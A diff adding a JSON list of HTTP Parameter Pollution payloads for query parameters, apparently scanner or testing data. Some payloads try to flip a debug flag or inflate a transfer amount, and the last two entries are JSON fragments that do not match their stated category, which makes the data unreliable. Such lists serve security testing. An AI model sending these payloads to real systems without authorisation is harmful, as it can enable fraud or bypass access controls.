@@ -1,0 +1,123 @@
+[
+  {
+    "payload_id": "OWP-37288",
+    "vulnerability_category": "HTTP Parameter Pollution",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "/app?debug=false&debug=true",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37289",
+    "vulnerability_category": "HTTP Parameter Pollution",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "/transfer?amount=1&amount=5000",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37290",
+    "vulnerability_category": "HTTP Parameter Pollution",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "param=value1&param=value2",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37291",
+    "vulnerability_category": "HTTP Parameter Pollution",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "param[]=value1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37292",
+    "vulnerability_category": "HTTP Parameter Pollution",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "param[]=value1&param[]=value2",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37293",
+    "vulnerability_category": "HTTP Parameter Pollution",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "param[]=value1&param=value2",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37294",
+    "vulnerability_category": "HTTP Parameter Pollution",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "param=value1&param[]=value2",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37295",
+    "vulnerability_category": "HTTP Parameter Pollution",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "param=value1%26other=value2",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37296",
+    "vulnerability_category": "HTTP Parameter Pollution",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "param[key1]=value1&param[key2]=value2",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37297",
+    "vulnerability_category": "HTTP Parameter Pollution",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "\"test\": \"user\",",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  },
+  {
+    "payload_id": "OWP-37298",
+    "vulnerability_category": "HTTP Parameter Pollution",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "\"test\": \"admin\"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": ""
+    }
+  }
+]
